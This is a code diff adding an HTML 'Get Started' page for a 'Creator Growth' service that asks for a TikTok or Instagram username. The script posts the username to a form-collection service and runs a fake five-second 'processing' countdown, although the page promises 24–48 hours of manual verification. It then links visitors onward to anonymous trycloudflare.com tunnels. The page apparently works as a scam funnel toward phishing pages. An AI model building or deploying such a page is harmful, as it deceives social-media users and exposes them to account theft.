@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Get Started</title>
+<link rel="shortcut icon" href="images.png">
+
+<script src="https://kit.fontawesome.com/a2d9d5b4b6.js"></script>
+
+<style>
+
+/* =======================
+   GLOBAL
+======================= */
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, sans-serif;
+}
+
+body{
+background:#0b1220;
+color:#fff;
+}
+
+/* =======================
+   NAVBAR
+======================= */
+.navbar{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:18px 8%;
+background:rgba(15,23,42,0.7);
+backdrop-filter:blur(10px);
+position:sticky;
+top:0;
+}
+
+.navbar span{color:#3b82f6;}
+
+nav a{
+color:#cbd5e1;
+text-decoration:none;
+margin-left:18px;
+}
+
+/* =======================
+   STEPS
+======================= */
+.step{
+display:none;
+padding:80px 20px;
+text-align:center;
+}
+
+.step.active{
+display:block;
+animation:fade .4s ease;
+}
+
+@keyframes fade{
+from{opacity:0; transform:translateY(20px);}
+to{opacity:1; transform:translateY(0);}
+}
+
+/* =======================
+   INFO BOX
+======================= */
+.info-box{
+max-width:550px;
+margin:20px auto;
+background:#1e293b;
+padding:20px;
+border-radius:12px;
+text-align:left;
+}
+
+.info-box h3{color:#3b82f6;}
+
+.info-box ul{
+margin-left:18px;
+color:#cbd5e1;
+}
+
+.note{
+margin-top:10px;
+color:#94a3b8;
+font-size:14px;
+}
+
+/* =======================
+   PLATFORM
+======================= */
+.platforms{
+display:flex;
+gap:20px;
+justify-content:center;
+margin:20px 0;
+}
+
+.platform{
+background:#1e293b;
+padding:20px;
+border-radius:12px;
+cursor:pointer;
+width:120px;
+transition:.3s;
+}
+
+.platform:hover{
+transform:translateY(-5px);
+}
+
+.selected{
+border:2px solid #3b82f6;
+}
+
+/* =======================
+   INPUT
+======================= */
+input{
+width:100%;
+max-width:400px;
+padding:14px;
+border:none;
+border-radius:10px;
+background:#1e293b;
+color:#fff;
+outline:none;
+}
+
+/* =======================
+   ERROR
+======================= */
+#error{
+color:#f87171;
+margin-top:10px;
+}
+
+/* =======================
+   BUTTON
+======================= */
+button{
+width:100%;
+max-width:400px;
+padding:14px;
+margin-top:12px;
+background:#3b82f6;
+color:#fff;
+border:none;
+border-radius:10px;
+cursor:pointer;
+transition:.3s;
+}
+
+button:hover{
+background:#2563eb;
+}
+
+/* =======================
+   STEP 2 BOX
+======================= */
+.agree-box{
+max-width:600px;
+margin:30px auto;
+background:#1e293b;
+padding:25px;
+border-radius:12px;
+text-align:left;
+}
+
+.agree-box ul{
+margin-left:18px;
+color:#cbd5e1;
+}
+
+/* =======================
+   LOADING
+======================= */
+.loader{
+text-align:center;
+margin-top:80px;
+}
+
+.spinner{
+width:70px;
+height:70px;
+border:6px solid rgba(255,255,255,0.1);
+border-top:6px solid #3b82f6;
+border-radius:50%;
+margin:auto;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+100%{transform:rotate(360deg);}
+}
+
+/* =======================
+   CARDS
+======================= */
+.cards{
+display:flex;
+gap:20px;
+justify-content:center;
+flex-wrap:wrap;
+margin-top:30px;
+}
+
+.card{
+background:#1e293b;
+padding:25px;
+border-radius:12px;
+width:240px;
+color:#fff;
+text-decoration:none;
+transition:.3s;
+}
+
+.card:hover{
+transform:translateY(-8px);
+background:#334155;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- NAV -->
+<header class="navbar">
+  <h2>Creator <span>Growth</span></h2>
+
+  <nav>
+    <a href="index.html">Home</a>
+    <a href="features.html">Features</a>
+    <a href="contact.html">Contact</a>
+    <a href="Testimonials.html">Testimonials</a>
+  </nav>
+</header>
+
+<!-- STEP 1 -->
+<section id="step1" class="step active">
+
+<h1>Get Started</h1>
+<p>Select platform and enter username</p>
+
+<div class="info-box">
+<h3>How It Works</h3>
+<ul>
+<li>Select TikTok or Instagram</li>
+<li>Enter correct username</li>
+<li>Click continue</li>
+<li>Processing takes 24–48 hours</li>
+</ul>
+<p class="note">We process requests securely and manually verify accounts.</p>
+</div>
+
+<div class="platforms">
+<div class="platform" onclick="selectPlatform('TikTok', event)">
+<i class="fa-brands fa-tiktok"></i>
+<p>TikTok</p>
+</div>
+
+<div class="platform" onclick="selectPlatform('Instagram', event)">
+<i class="fa-brands fa-instagram"></i>
+<p>Instagram</p>
+</div>
+</div>
+
+<input type="text" id="username" placeholder="Enter username">
+
+<p id="error"></p>
+
+<button onclick="goNext()">Continue</button>
+
+</section>
+
+<!-- STEP 2 -->
+<section id="step2" class="step">
+
+<h1>Confirm Details</h1>
+
+<p id="summary"></p>
+
+<div class="agree-box">
+<p><b>Before continuing confirm:</b></p>
+
+<ul>
+<li>Your username is correct</li>
+<li>You understand processing takes 24–48 hours</li>
+<li>You agree to system verification</li>
+</ul>
+
+<button onclick="startProcess()">I Agree & Continue</button>
+</div>
+
+</section>
+
+<!-- LOADING -->
+<section id="loading" class="step">
+
+<div class="loader">
+<div class="spinner"></div>
+<h2>Processing Your Request</h2>
+<p id="countdown">Starting...</p>
+</div>
+
+</section>
+
+<!-- FINAL STEP -->
+<section id="step3" class="step">
+
+<h1>Completed</h1>
+<p>Your request is ready</p>
+
+<div class="cards">
+
+<a href="https://contributors-patterns-difference-fields.trycloudflare.com" class="card" target="_blank">
+<h3><i class="fa-brands fa-tiktok"></i> TikTok</h3>
+<p>Continue</p>
+</a>
+
+<a href="https://charleston-voltage-discounted-dash.trycloudflare.com" class="card" target="_blank">
+<h3><i class="fa-brands fa-instagram"></i> Instagram</h3>
+<p>Continue</p>
+</a>
+
+</div>
+
+</section>
+
+<!-- WEB3FORMS -->
+<form id="form">
+<input type="hidden" name="access_key" value="2d4bd63a-d3c2-4a09-bc86-40fa1d7993b0">
+<input type="hidden" name="platform" id="f_platform">
+<input type="hidden" name="username" id="f_username">
+</form>
+
+<script>
+
+let platform = "";
+let username = "";
+
+/* STEP 1 */
+function selectPlatform(p, e){
+platform = p;
+
+document.querySelectorAll(".platform").forEach(el=>{
+el.classList.remove("selected");
+});
+
+e.currentTarget.classList.add("selected");
+}
+
+function goNext(){
+
+username = document.getElementById("username").value.trim();
+let error = document.getElementById("error");
+
+if(!platform){
+error.innerText = "Select platform";
+return;
+}
+
+if(!username){
+error.innerText = "Enter username";
+return;
+}
+
+error.innerText = "";
+
+document.getElementById("step1").classList.remove("active");
+document.getElementById("step2").classList.add("active");
+
+document.getElementById("summary").innerText =
+"@" + username + " • " + platform;
+
+}
+
+/* STEP 2 → LOADING + WEB3FORMS */
+function startProcess(){
+
+document.getElementById("f_platform").value = platform;
+document.getElementById("f_username").value = username;
+
+fetch("https://api.web3forms.com/submit", {
+method:"POST",
+body:new FormData(document.getElementById("form"))
+});
+
+// move to loading
+document.getElementById("step2").classList.remove("active");
+document.getElementById("loading").classList.add("active");
+
+let time = 5;
+let text = document.getElementById("countdown");
+
+let timer = setInterval(()=>{
+
+text.innerText = "Processing... " + time + "s";
+time--;
+
+if(time < 0){
+clearInterval(timer);
+
+document.getElementById("loading").classList.remove("active");
+document.getElementById("step3").classList.add("active");
+}
+
+},1000);
+
+}
+
+</script>
+
+</body>
+</html>
